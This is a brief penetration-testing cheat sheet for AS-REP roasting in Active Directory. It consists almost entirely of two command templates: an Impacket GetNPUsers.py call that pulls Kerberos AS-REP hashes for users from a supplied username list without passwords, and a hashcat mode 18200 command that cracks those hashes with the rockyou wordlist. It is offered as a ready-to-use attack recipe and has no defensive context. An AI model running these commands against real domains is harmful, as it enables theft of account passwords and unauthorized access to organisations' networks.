# Active Directory AS-REP Roasting

*Requirements :*  
Valid usernames list

## Retrieve TGT \ Impacket

```bash
GetNPUsers.py <TARGET DOMAIN>/ -dc-ip <DC IP>  -usersfile <USERLIST> -no-pass
```

## Crack TGTs \ hashcat

```bash
hashcat -a 0 -m 18200 <HASH FILE> /usr/share/wordlists/rockyou.txt
```